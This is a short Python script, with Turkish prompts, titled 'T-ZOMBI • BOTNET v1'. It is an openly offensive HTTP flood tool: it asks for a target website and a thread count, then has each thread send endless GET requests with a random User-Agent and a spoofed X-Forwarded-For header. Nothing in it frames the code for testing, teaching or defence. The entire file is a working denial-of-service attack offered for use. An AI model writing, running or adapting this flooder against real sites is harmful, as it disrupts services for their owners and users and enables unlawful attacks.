import requests
import threading
import random
import time

def flood(target, thread_id):
    headers = {
        "User-Agent": f"T-Zombi/{random.randint(1000,9999)}",
        "X-Forwarded-For": f"192.168.{random.randint(1,255)}.{random.randint(1,255)}"
    }
    while True:
        try:
            response = requests.get(target, headers=headers)
            print(f"[{thread_id}] → {target} | Kod: {response.status_code}")
        except Exception as e:
            print(f"[{thread_id}] → Hata: {e}")
        time.sleep(0.2)

if __name__ == "__main__":
    print("╔═══════════════════════════════════╗")
    print("║        T-ZOMBI • BOTNET v1        ║")
    print("╚═══════════════════════════════════╝")
    target = input("🎯 Site adresi (https://...): ")
    try:
        thread_count = int(input("💥 Kaç zombi aktif olsun? (örn: 10): "))
    except:
        thread_count = 10

    print(f"\n[✓] Saldırı başlıyor: {target} ({thread_count} bot)\n")
    for i in range(thread_count):
        t = threading.Thread(target=flood, args=(target, i+1))
        t.daemon = True
        t.start()

    while True:
        time.sleep(1)
